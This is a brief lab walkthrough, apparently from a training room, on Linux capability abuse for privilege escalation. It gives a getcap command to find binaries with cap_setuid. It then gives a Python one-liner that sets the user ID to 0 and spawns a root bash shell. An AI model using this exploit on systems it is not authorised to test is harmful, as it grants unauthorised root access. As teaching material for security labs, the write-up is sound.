**Detection**

Linux VM

1. In command prompt type: 
   
```
getcap -r / 2>/dev/null
```

2. From the output, notice the value of the “cap_setuid” capability.

**Exploitation**

Linux VM

1. In command prompt type:

```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```


![[Pasted image 20240602232434.png]]


2. Enjoy root!

Answer the questions below

Click 'Completed' once you have successfully elevated the machine